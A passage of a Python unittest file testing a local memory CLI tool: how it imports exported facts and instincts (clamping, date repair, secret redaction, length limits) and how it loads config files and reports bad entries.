            bad_repo = self.write_export({"repositories": {"abc123": {"memory": "Likes tea"}}})
            self.assertEqual(self.run_cli("import", str(bad_repo))[0], 1)
            self.assertFalse(mem.memory_root().exists())

    def test_confidence_is_clamped_to_the_maximum_and_zero(self):
        self.assertEqual(self.global_instinct(confidence=5.0)["confidence"], mem.MAX_CONFIDENCE)
        self.assertEqual(self.global_instinct(confidence=-3)["confidence"], 0.0)

    def test_non_numeric_confidence_is_rejected(self):
        self.assertEqual(self.run_cli("import", str(self.write_export({"global_instincts": [
            {"id": "tidy", "trigger": "t", "action": "a", "confidence": "high"}]})))[0], 1)
        self.assertFalse(mem.memory_root().exists())

    def test_bad_dates_become_today(self):
        meta = self.global_instinct(last_seen="yesterday", created="2020-02-30")
        self.assertEqual(meta["last_seen"], mem.today())
        self.assertEqual(meta["created"], mem.today())
        meta = self.global_instinct(last_seen="2021-05-04", created="2020-01-02")
        self.assertEqual((meta["created"], meta["last_seen"]), ("2020-01-02", "2021-05-04"))

    def test_secret_in_imported_fact_is_redacted(self):
        with mock.patch.dict(os.environ, {"LOCAL_MEMORY_HOME": str(self.tmp / "fresh")}):
            export = self.write_export({"user_memory": ["Deploy with token=abc123secret"]})
            self.assertEqual(self.run_cli("import", str(export))[0], 0)
            facts = mem.read_facts(mem.memory_root())
            self.assertEqual(len(facts), 1)
            self.assertNotIn("abc123secret", facts[0])
            self.assertIn("[REDACTED]", facts[0])

    def test_over_long_imported_fact_is_rejected_and_writes_nothing(self):
        with mock.patch.dict(os.environ, {"LOCAL_MEMORY_HOME": str(self.tmp / "fresh")}):
            export = self.write_export({"user_memory": ["ok fact", "x" * (mem.MAX_FACT_CHARS + 1)]})
            self.assertEqual(self.run_cli("import", str(export))[0], 1)
            self.assertFalse(mem.memory_root().exists())


if __name__ == "__main__":
    unittest.main()


class ConfigTest(MemTestCase):
    def setUp(self):
        super().setUp()
        self.addCleanup(lambda: (vars(mem).update(mem._DEFAULTS), mem.CONFIG_PROBLEMS.clear()))
        self.config = mem.config_path()
        self.config.parent.mkdir(parents=True)

    def test_file_overrides_a_limit(self):
        self.config.write_text('{"max_fact_chars": 20, "ACTIVE_MAX_INSTINCTS": 0, "step_up": 0.3}')
        self.assertEqual(self.run_cli("remember", "--user", "x" * 21)[0], 1)
        self.assertEqual((mem.MAX_FACT_CHARS, mem.ACTIVE_MAX_INSTINCTS, mem.STEP_UP), (20, 0, 0.3))
        self.assertEqual(mem.CONFIG_PROBLEMS, [])

    def test_bad_entries_are_ignored_and_reported(self):
        self.config.write_text('{"max_fact_chars": "big", "keep_rotated": 0, "max_confidence": 5, "max_evidence": 2.5,'
                               ' "typo": 1, "max_memory_lines": true, "max_prompt_chars": 50}')
        code, out = self.run_cli("status")
        self.assertEqual(code, 0)
        self.assertEqual(mem.MAX_PROMPT_CHARS, 50)
        for name in ("max_fact_chars", "keep_rotated", "max_confidence", "max_evidence", "typo", "max_memory_lines"):
            self.assertIn(f"ignored: {name}" if name != "typo" else "unknown setting 'typo'", out)
        self.assertEqual((mem.MAX_FACT_CHARS, mem.KEEP_ROTATED, mem.MAX_CONFIDENCE), (300, 3, 0.9))

    def test_corrupt_file_keeps_defaults(self):
        for text in ("{not json", "[1, 2]"):
            self.config.write_text(text)
            self.assertEqual(self.run_cli("status")[0], 0)
            self.assertEqual(mem.MAX_FACT_CHARS, 300)
            self.assertEqual(len(mem.CONFIG_PROBLEMS), 1)
